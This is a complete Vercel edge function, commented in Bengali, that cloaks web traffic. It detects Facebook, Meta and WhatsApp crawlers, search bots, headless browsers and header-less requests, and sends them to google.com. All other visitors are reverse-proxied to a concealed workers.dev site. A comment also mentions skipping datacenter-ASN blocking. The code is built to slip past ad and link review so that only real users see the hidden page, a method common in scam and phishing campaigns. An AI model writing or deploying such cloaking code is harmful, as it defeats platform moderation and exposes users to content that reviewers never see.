export const config = {
  runtime: 'edge',
};

export default async function handler(request) {
  const userAgent = request.headers.get('user-agent') || '';
  
  // ১. বট ডিটেকশন প্যাটার্ন
  const botPatterns = /facebookexternalhit|Facebot|meta-externalagent|WhatsApp|bot|crawl|spider|headless|puppeteer|lighthouse|python|curl|wget|applebot|bingbot|googlebot/i;
  const isBotUA = botPatterns.test(userAgent);
  
  // ২. ফেব ইন-অ্যাপ ব্রাউজার ডিটেকশন
  const isFbInAppBrowser = /FBAN|FBAV|Instagram/i.test(userAgent);
  
  // [বিঃদ্রঃ] Vercel সরাসরি Cloudflare-এর মতো ASN দেয় না।
  // তাই ASN ডাটা সেন্টার ব্লক করার লজিকটি এখানে স্কিপ করা হয়েছে বা থার্ড-পার্টি API ব্যবহার করতে হবে।

  // ৩. বিহেভিয়ারাল চেক (Client Hints চেক করা)
  const hasSecCH = request.headers.has('sec-ch-ua');
  const hasAcceptLang = request.headers.has('accept-language');

  // --- লজিক ---
  // যদি নিশ্চিত বট হয়
  if (isBotUA) {
    return Response.redirect('https://google.com/', 302);
  }

  // যদি কোনো ল্যাঙ্গুয়েজ বা ক্লায়েন্ট হিন্টস না থাকে (সন্দেহজনক ট্রাফিক)
  if (!hasAcceptLang && !hasSecCH && !isFbInAppBrowser) {
    return Response.redirect('https://google.com/', 302);
  }

  // --- আসল ইউজারদের জন্য ---
  const targetUrl = new URL(request.url);
  targetUrl.hostname = 'site.nsjayeb.workers.dev'; 

  // Proxying (Reverse Proxy)
  // Vercel Edge এ fetch ব্যবহার করে রেসপন্স রিটার্ন করা যায়
  const response = await fetch(new Request(targetUrl, request));
  
  // রেসপন্সটি সরাসরি ইউজারের কাছে পাঠানো
  return response;
}